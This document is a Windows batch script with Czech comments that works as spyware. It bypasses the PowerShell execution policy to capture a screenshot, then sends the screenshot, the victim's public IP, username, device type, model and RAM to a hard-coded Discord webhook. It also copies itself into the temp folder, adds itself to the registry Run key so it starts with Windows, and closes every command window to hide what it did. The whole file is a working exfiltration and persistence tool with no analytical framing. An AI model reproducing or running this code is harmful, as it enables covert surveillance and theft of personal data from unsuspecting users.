@echo off
chcp 65001 >nul
setlocal EnableDelayedExpansion

:: ✅ NOVÝ Webhook URL
set "webhook=https://discord.com/api/webhooks/1439411134137499698/1LxkdwQcxAxk-N_ZDkZQ1TRUiAgqiaqhPpkgcN6KIiFO1m5PWw6aDAm0cFOE445el1c8"

:: 📸 Screenshot přes PowerShell
powershell -ExecutionPolicy Bypass -Command ^
"Add-Type -AssemblyName System.Windows.Forms; ^
Add-Type -AssemblyName System.Drawing; ^
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; ^
$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; ^
$graphics = [System.Drawing.Graphics]::FromImage($bitmap); ^
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); ^
$path = \"$env:TEMP\screenshot.png\"; ^
$bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)"

:: 📤 Odeslání screenshotu
curl -X POST %webhook% ^
  -F "file=@%TEMP%\screenshot.png;type=image/png"
del /f /q "%TEMP%\screenshot.png"

:: ⏱️ Pauza 2 sekundy
timeout /t 2 >nul

:: 🌍 Získání systémových informací
for /f "delims=" %%x in ('curl -s https://api.ipify.org') do set "ip=%%x"
set "user=%USERNAME%"
for /f "tokens=1-4 delims=. " %%x in ("%date%") do (
    set "d1=%%x"
    set "d2=%%y"
    set "d3=%%z"
)
for /f "tokens=1-2 delims=: " %%x in ("%time%") do (
    set "t1=%%x"
    set "t2=%%y"
)
set "timestamp=!d1!.!d2!.!d3! !t1!:!t2!"

:: 💻 Typ zařízení
set "deviceType=Stolní PC"
for /f %%i in ('wmic path Win32_Battery get Name ^| findstr /i /v "Name"') do (
    set "deviceType=Notebook"
)

:: 🖥️ Model zařízení
set "deviceModel=Neznámý model"
for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get model') do (
    if not defined deviceModel (
        set "deviceModel=%%i"
    )
)

:: 🧠 RAM
for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get totalphysicalmemory') do set "ramRaw=%%i"
set /a ram=%ramRaw:~0,-6%

:: 🧾 Sestavení zprávy
set "msg=🛰️ IP: ||!ip!||\nČas: !timestamp!\nUživatel: !user!\nZařízení: !deviceType!\nModel: !deviceModel!\nRAM: !ram! GB"

:: 💾 Uložení zprávy do JSON a odeslání
echo { > "%TEMP%\payload.json"
echo   "content": "!msg!" >> "%TEMP%\payload.json"
echo } >> "%TEMP%\payload.json"

curl -X POST %webhook% -H "Content-Type: application/json" --data "@%TEMP%\payload.json"
del /f /q "%TEMP%\payload.json"

:: 🔁 Přesun sebe sama do %TEMP% pouze při prvním spuštění
set "targetPath=%TEMP%\takpojd.bat"

:: Pokud už jsme ve %TEMP%, přeskoč přesun
echo %~dp0 | find /i "%TEMP%" >nul
if not errorlevel 1 (
    goto afterMove
)

:: 🛠️ Vytvoření pomocného skriptu pro přesun
echo @echo off > "%TEMP%\movehelper.bat"
echo timeout /t 2 ^>nul >> "%TEMP%\movehelper.bat"
echo move /y "%~f0" "!targetPath!" ^>nul >> "%TEMP%\movehelper.bat"
echo del "%%~f0" ^>nul >> "%TEMP%\movehelper.bat"

:: ▶️ Spuštění pomocného skriptu
start "" "%TEMP%\movehelper.bat"
exit

:afterMove

:: 🔁 Registrace do autostartu
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "takpojd" /t REG_SZ /d "!targetPath!" /f >nul

:: ❌ Zavření všech CMD oken
taskkill /f /im cmd.exe >nul 2>&1